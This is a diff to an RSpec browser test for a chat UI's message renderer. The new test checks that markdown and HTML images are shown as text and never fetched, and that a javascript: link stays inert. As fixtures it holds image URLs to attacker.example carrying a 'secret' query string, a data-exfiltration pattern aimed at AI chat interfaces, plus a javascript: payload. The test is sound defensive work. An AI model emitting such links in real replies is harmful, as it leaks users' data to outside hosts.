@@ -63,10 +63,14 @@ RSpec.describe 'The chat UI message controller', :generator do # rubocop:disable
     wait_for { browser.evaluate('window.controller !== undefined') }
   end
 
+  def other_requests = @other_requests ||= []
+
   def serve_files
     browser.network.intercept
     browser.on(:request) do |request|
-      body = files[URI(request.url).path]
+      uri = URI(request.url)
+      other_requests << request.url unless uri.host == 'chat.test'
+      body = files[uri.path] if uri.host == 'chat.test'
       next request.abort unless body
 
       type = request.url.end_with?('.js') ? 'text/javascript' : 'text/html'
@@ -89,10 +93,32 @@ RSpec.describe 'The chat UI message controller', :generator do # rubocop:disable
     wait_for { output_html.include?('<strong>') }
 
     expect(output_html).to include('<strong>bold</strong>')
-    expect(output_html).not_to include('onerror')
+    expect(output_html).not_to include('<img')
     expect(output_html).not_to include('<script')
     expect(browser.evaluate('window.pwned')).to be_nil
     expect(browser.evaluate("document.getElementById('message_1_stream').hidden")).to be(true)
+  end
+
+  it 'shows images as text without fetching them, and keeps javascript: links inert' do
+    reply = <<~MARKDOWN
+      ![chart](https://attacker.example/md?q=secret)
+
+      <img src="https://attacker.example/html?q=secret" alt="secret"> <video src="https://attacker.example/video"></video>
+
+      [docs](https://rubyllm.com) and [click](javascript:window.pwned=3)
+    MARKDOWN
+    open_message(ERB::Util.html_escape(reply))
+    wait_for { output_html.include?('docs') }
+    sleep 0.3
+
+    expect(other_requests).to be_empty
+    expect(output_html).to include('[image: chart](https://attacker.example/md?q=secret)')
+    expect(output_html).not_to match(/<(img|video|source|picture|iframe)\b/)
+    expect(output_html).to include('<a href="https://rubyllm.com">docs</a>')
+    expect(output_html).not_to include('javascript:')
+
+    browser.execute("[...document.querySelectorAll('[data-chat-message-target=output] a')].at(-1).click()")
+    expect(browser.evaluate('window.pwned')).to be_nil
   end
 
   it 'orders streamed chunks and shows only the run without gaps' do
